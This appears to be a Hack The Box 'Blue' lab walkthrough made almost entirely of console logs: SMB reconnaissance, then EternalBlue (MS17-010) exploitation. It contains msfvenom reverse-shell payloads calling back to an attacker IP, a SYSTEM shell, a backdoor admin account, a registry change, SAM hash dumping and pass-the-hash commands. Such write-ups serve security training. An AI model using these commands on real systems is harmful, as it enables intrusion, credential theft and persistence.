
```console
root@kali:~/HTB/BLUE# ping -c 4 10.10.10.40
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=140 ms
64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=142 ms
64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=155 ms
64 bytes from 10.10.10.40: icmp_seq=4 ttl=127 time=141 ms

--- 10.10.10.40 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 140.285/144.852/155.747/6.332 ms
```




```console
root@kali:~/HTB/BLUE# nmap -Pn -sT -n 10.10.10.40 --reason --max-retries 2 --min-rate 1000
Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:27 CDT
Warning: 10.10.10.40 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.14s latency).
Not shown: 953 closed ports, 38 filtered ports
Reason: 953 conn-refused and 38 no-responses
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
49152/tcp open  unknown      syn-ack
49153/tcp open  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49155/tcp open  unknown      syn-ack
49156/tcp open  unknown      syn-ack
49157/tcp open  unknown      syn-ack

Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
```


```console
root@kali:~/HTB/BLUE# nmap -Pn -sT -sV -n 10.10.10.40 --reason -p 135,139,445,49152,49153,49154,49155,49156,49157
Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:29 CDT
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 19:30 (0:00:17 remaining)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.14s latency).

PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.14 seconds
```


Recon - TCP/445

```console
root@kali:~/HTB/BLUE# nmap -Pn -sT -n --script "vuln" 10.10.10.40 -p 135,139,445
Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:38 CDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.40
Host is up (0.19s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 51.66 seconds
```

```console
oot@kali:~/HTB/BLUE# nmap -Pn -sT -n --script "vuln and safe" 10.10.10.40 -p 135,139,445
Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:39 CDT
Nmap scan report for 10.10.10.40
Host is up (0.27s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 3.68 seconds
```

```console
root@kali:~/HTB/BLUE# nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:41 CDT
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.40
Host is up (0.14s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.40\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.10.40\Share: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.10.40\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 60.74 seconds
root@kali:~/HTB/BLUE# 
```


```console
root@kali:~/HTB/BLUE# smbclient -L 10.10.10.40 -N 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```



```console
root@kali:~/HTB/BLUE# smbmap -H 10.10.10.40 -u 'null'
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.40...
[+] IP: 10.10.10.40:445	Name: 10.10.10.40                                       
	Disk                                            	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	NO ACCESS
	Share                                             	READ ONLY
	Users                                             	READ ONLY
```

```console
root@kali:~/HTB/BLUE# smbclient //10.10.10.40/Users -N
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Jul 21 01:56:23 2017
  ..                                 DR        0  Fri Jul 21 01:56:23 2017
  Default                           DHR        0  Tue Jul 14 02:07:31 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:54:24 2009
  Public                             DR        0  Tue Apr 12 02:51:29 2011

		8362495 blocks of size 4096. 4212135 blocks available
smb: \> 
```


```console
smb: \> dir ../../../Public/
  .                                  DR        0  Tue Apr 12 02:51:29 2011
  ..                                 DR        0  Tue Apr 12 02:51:29 2011
  Desktop                           DHR        0  Mon Jul 13 23:54:24 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:54:24 2009
  Documents                          DR        0  Tue Jul 14 00:08:56 2009
  Downloads                          DR        0  Mon Jul 13 23:54:24 2009
  Favorites                         DHR        0  Mon Jul 13 21:34:59 2009
  Libraries                         DHR        0  Mon Jul 13 23:54:24 2009
  Music                              DR        0  Mon Jul 13 23:54:24 2009
  Pictures                           DR        0  Mon Jul 13 23:54:24 2009
  Recorded TV                        DR        0  Tue Apr 12 02:51:29 2011
  Videos                             DR        0  Mon Jul 13 23:54:24 2009
  
		8362495 blocks of size 4096. 4212918 blocks available
smb: \> dir ../../../Administrator
  Administrator                       D        0  Fri Jul 21 01:56:36 2017

		8362495 blocks of size 4096. 4212918 blocks available
smb: \> dir ../../../Administrator/
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \Administrator\
smb: \> 
```

```console
root@kali:~/HTB/BLUE# mkdir smbFolder
root@kali:~/HTB/BLUE# mount -t cifs //10.10.10.40/Users /root/HTB/BLUE/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
```

```console
root@kali:~/HTB/BLUE/smbFolder# ls -la
total 9
drwxr-xr-x 2 root root 4096 jul 21  2017 .
drwxr-xr-x 3 root root 4096 abr 28 19:54 ..
dr-xr-xr-x 2 root root    0 jul 14  2009 Default
-rwxr-xr-x 1 root root  174 jul 13  2009 desktop.ini
dr-xr-xr-x 2 root root    0 abr 12  2011 Public
```


```console
root@kali:~/HTB/BLUE/smbFolder/Default# smbcacls //10.10.10.40/Users Default/Desktop -N
WARNING: The "syslog" option is deprecated
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:BUILTIN\Administrators
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Users:ALLOWED/I/READ
ACL:BUILTIN\Users:ALLOWED/OI|CI|IO|I/0xa0000000
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
root@kali:~/HTB/BLUE/smbFolder/Default# smbcacls //10.10.10.40/Users Default/Desktop -N | grep Everyone
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
```

```console
root@kali:~/HTB/BLUE/smbFolder/Default# smbcacls //10.10.10.40/Users Default/Desktop -N | grep Everyone
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
```

```console
root@kali:~/HTB/BLUE/smbFolder/Default# for ls in $(ls); do echo $ls; done | grep -v -i "ntuser" | while read line; do echo $line; smbcacls //10.10.10.40/Users Default/$line -N | grep -i everyone; done
AppData
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Desktop
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Documents
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Downloads
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Favorites
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Links
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Music
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Pictures
WARNING: The "syslog" option is deprecated
ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
Saved
WARNING: The "syslog" option is deprecated
Games
WARNING: The "syslog" option is deprecated
Videos
WARNING: The "syslog" option is deprecated

ACL:Everyone:ALLOWED/I/READ
ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
```

```console
root@kali:~/HTB/BLUE# searchsploit eternalblue
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)  | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code E | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution ( | windows_x86-64/remote/42030.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
---------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                      |  Path
---------------------------------------------------------------------------------- ---------------------------------
How to Exploit ETERNALBLUE and DOUBLEPULSAR on Windows 7/2008                     | docs/english/41896-how-to-exploi
How to Exploit ETERNALBLUE on Windows Server 2012 R2                              | docs/english/42280-how-to-exploi
[Spanish] How to Exploit ETERNALBLUE and DOUBLEPULSAR on Windows 7/2008           | docs/spanish/41897-[spanish]-how
[Spanish] How to Exploit ETERNALBLUE on Windows Server 2012 R2                    | docs/spanish/42281-[spanish]-how
---------------------------------------------------------------------------------- ---------------------------------
root@kali:~/HTB/BLUE# searchsploit -x 42315
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
File Type: Python script, ASCII text executable, with CRLF line terminators
```

```console
root@kali:~/HTB/BLUE# searchsploit -x 42315
root@kali:~/HTB/BLUE# searchsploit -m 42315
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/HTB/BLUE/42315.py
```

```console
root@kali:~/HTB/BLUE# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
--2021-04-28 20:18:16--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py
Resolviendo github.com (github.com)... 140.82.114.3
Conectando con github.com (github.com)[140.82.114.3]:443... conectado.
Petición HTTP enviada, esperando respuesta... 302 Found
Localización: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py [siguiendo]
--2021-04-28 20:18:16--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 16669 (16K) [text/plain]
Grabando a: “mysmb.py”

mysmb.py                              100%[======================================================================>]  16,28K  --.-KB/s    en 0s      

2021-04-28 20:18:17 (32,2 MB/s) - “mysmb.py” guardado [16669/16669]
```

```console
root@kali:~/HTB/BLUE# ls -la
total 88
drwxr-xr-x 3 root root  4096 abr 28 20:17 .
drwxr-xr-x 3 root root  4096 abr 28 19:22 ..
-rwxr-xr-x 1 root root 41968 abr 28 20:15 42315.py
-rw-r--r-- 1 root root 16669 abr 28 20:18 mysmb.py
drwxr-xr-x 2 root root  4096 jul 21  2017 smbFolder
-rw-r--r-- 1 root root     5 abr 28 19:50 smb_text.txt
-rw-r--r-- 1 root root  1024 abr 28 19:24 .writeup.txt.swp
root@kali:~/HTB/BLUE# 
```

```console
oot@kali:~/HTB/BLUE# python 42315.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Not found accessible named pipe
Done
root@kali:~/HTB/BLUE# 
```


```python

'''

USERNAME = 'guest'
PASSWORD = ''

'''
A transaction with empty setup:
- it is allocated from paged pool (same as other transaction types) on Windows 7 and later
- it is allocated from private heap (RtlAllocateHeap()) with no on use it on Windows Vista and earlier
- no lookaside or caching method for allocating it

Note: method name is from NSA eternalromance

For Windows 7 and later, it is good to use matched pair method (one is large pool and another one is fit
for freed pool from large pool). Additionally, the exploit does the information leak to check transactions
alignment before doing OOB write. So this exploit should never crash a target against Windows 7 and later.

For Windows Vista and earlier, matched pair method is impossible because we cannot allocate transaction size
smaller than PAGE_SIZE (Windows XP can but large page pool does not split the last page of allocation). But
a transaction with empty setup is allocated on private heap (it is created by RtlCreateHeap() on initialing server).
Only this transaction type uses this heap. Normally, no one uses this transaction type. So transactions alignment
```

```console
root@kali:~/HTB/BLUE# python 42315.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8003fe7ba0
SESSION: 0xfffff8a001687de0
FLINK: 0xfffff8a001938088
InParam: 0xfffff8a00193215c
MID: 0x3203
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done
root@kali:~/HTB/BLUE#
```

```console
root@kali:~/HTB/BLUE# msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: exploit.exe
```

```console
root@kali:~/HTB/BLUE# python 42315.py 10.10.10.40 samr exploit.exe 
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa80027761e0
SESSION: 0xfffff8a0015ec2a0
FLINK: 0xfffff8a0041fe088
InParam: 0xfffff8a0041f815c
MID: 0x3b03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service dHuq.....
Starting service dHuq.....
The NETBIOS connection with the remote host timed out.
Removing service dHuq.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
root@kali:~/HTB/BLUE#
```

```console
root@kali:~/HTB/BLUE# nc -lvnp 4444
listening on [any] 4444 ...

connect to [10.10.14.28] from (UNKNOWN) [10.10.10.40] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::4994:8022:8646:f18
   Temporary IPv6 Address. . . . . . : dead:beef::4159:bad7:b103:3834
   Link-local IPv6 Address . . . . . : fe80::4994:8022:8646:f18%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.40
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a0b9%11
                                       10.10.10.2

Tunnel adapter isatap.{CBC67B8A-5031-412C-AEA7-B3186D30360E}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\system32>
```





```console
root@kali:~/HTB/BLUE# git clone https://github.com/worawit/MS17-010.git
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 548.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
```


```console
root@kali:~/HTB/BLUE/MS17-010# python checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```



```console
root@kali:~/HTB/BLUE# git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
Clonando en 'AutoBlue-MS17-010'...
remote: Enumerating objects: 126, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (43/43), done.
remote: Total 126 (delta 28), reused 13 (delta 6), pack-reused 76
Recibiendo objetos: 100% (126/126), 109.65 KiB | 802.00 KiB/s, listo.
Resolviendo deltas: 100% (68/68), listo.
root@kali:~/HTB/BLUE# 
root@kali:~/HTB/BLUE# cd AutoBlue-MS17-010/
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# ls
eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   requirements.txt  zzz_exploit.py
eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  README.md  shellcode
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# python eternal_checker.py 10.10.10.40
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done
root@kali:~/HTB/BLUE/AutoBlue-MS17-010#
```

```console
root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# ls
eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# ./shell_prep.sh 
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
Y
LHOST for reverse connection:
10.10.14.28
LPORT you want x64 to listen on:
4444
LPORT you want x86 to listen on:
4445
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.28 LPORT=4445
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# 
```


```console
root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# ls -la
total 88
drwxr-xr-x 2 root root  4096 abr 28 20:34 .
drwxr-xr-x 4 root root  4096 abr 28 20:27 ..
-rw-r--r-- 1 root root 20305 abr 28 20:26 eternalblue_kshellcode_x64.asm
-rw-r--r-- 1 root root 19862 abr 28 20:26 eternalblue_kshellcode_x86.asm
-rw-r--r-- 1 root root  1598 abr 28 20:26 eternalblue_sc_merge.py
-rw-r--r-- 1 root root  2205 abr 28 20:34 sc_all.bin
-rw-r--r-- 1 root root  1232 abr 28 20:34 sc_x64.bin
-rw-r--r-- 1 root root   772 abr 28 20:33 sc_x64_kernel.bin
-rw-r--r-- 1 root root   460 abr 28 20:34 sc_x64_msf.bin
-rw-r--r-- 1 root root   962 abr 28 20:34 sc_x86.bin
-rw-r--r-- 1 root root   638 abr 28 20:33 sc_x86_kernel.bin
-rw-r--r-- 1 root root   324 abr 28 20:34 sc_x86_msf.bin
-rwxr-xr-x 1 root root  4557 abr 28 20:26 shell_prep.sh
root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# 
```


```console
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin 
shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 
```

```console
root@kali:~/HTB/BLUE/smbFolder/Default# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```


```console
root@kali:~/HTB/BLUE/smbFolder/Default# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>net user admin admin /add
net user admin admin /add
The command completed successfully.
C:\Windows\system32>net localgroup administrators admin /add
net localgroup administrators admin /add
The command completed successfully.
```

```console
C:\Windows\system32>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
haris                    
The command completed with one or more errors.


C:\Windows\system32>
```

```console
C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
haris
The command completed successfully.


C:\Windows\system32>
```


```console
C:\Users\haris\Desktop>type user.txt
type user.txt
4c546aea7dbee75cbd71de245c8deea9
C:\Users\haris\Desktop>
```

```console
C:\Users\Administrator\Desktop>type root.txt
type root.txt
ff548eb71e920ff6c08843ce9df4e717
C:\Users\Administrator\Desktop>
```


```console
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin'
CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\admin:admin 
[*] KTHXBYE!
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 
```


```console
C:\Windows\system32>cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
The operation completed successfully.

C:\Windows\system32>
```

```console
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -x 'whoami'
CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\admin:admin (Pwn3d!)
CME          10.10.10.40:445 HARIS-PC        [+] Executed command 
CME          10.10.10.40:445 HARIS-PC        haris-pc\admin
[*] KTHXBYE!
root@kali:~/HTB/BLUE/AutoBlue-MS17-010#
```


root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\admin:admin (Pwn3d!)
CME          10.10.10.40:445 HARIS-PC        [+] Dumping local SAM hashes (uid:rid:lmhash:nthash)
CME          10.10.10.40:445 HARIS-PC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
CME          10.10.10.40:445 HARIS-PC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CME          10.10.10.40:445 HARIS-PC        haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
[*] KTHXBYE!
root@kali:~/HTB/BLUE/AutoBlue-MS17-010#


root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -x 'whoami'
CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\Administrator cdf51b162460b7d5bc898f493751a0cc (Pwn3d!)
CME          10.10.10.40:445 HARIS-PC        [+] Executed command 
CME          10.10.10.40:445 HARIS-PC        haris-pc\administrator
[*] KTHXBYE!







root@kali:~/HTB/BLUE/AutoBlue-MS17-010# pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc //10.10.10.40 cmd.exe
